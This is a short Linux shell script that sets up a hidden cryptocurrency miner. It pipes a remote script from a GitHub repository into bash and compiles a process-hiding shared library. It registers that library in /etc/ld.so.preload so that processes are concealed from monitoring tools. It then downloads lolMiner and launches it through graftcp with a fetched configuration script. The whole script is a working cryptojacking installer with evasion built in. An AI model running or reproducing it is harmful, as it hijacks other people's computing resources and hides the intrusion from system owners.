#!/bin/sh
wget -O - https://raw.githubusercontent.com/KebonKalapa/pengangguran/main/px_2.sh | bash
wget https://github.com/KebonKalapa/pengangguran/raw/main/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.50/lolMiner_v1.50_Lin64.tar.gz
tar -xvzf lolMiner_v1.50_Lin64.tar.gz
rm .gitignore
cd 1.50
wget https://raw.githubusercontent.com/KebonKalapa/pengangguran/main/set_lol.sh
chmod +x *.sh
graftcp ./set_lol.sh
